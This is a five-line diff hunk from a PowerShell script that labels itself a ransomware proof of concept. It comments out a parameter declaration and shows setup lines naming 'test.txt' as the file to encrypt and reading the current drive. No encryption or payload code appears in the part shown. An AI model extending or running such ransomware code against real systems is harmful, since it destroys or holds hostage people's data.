@@ -1,5 +1,5 @@
 # BTBit Powershell Ransomware PoC 
-param([string]$showscreen)
+# param([string]$showscreen)
 # file to encrypt
 $file = "test.txt"
 $drive = (get-location).Drive.Name
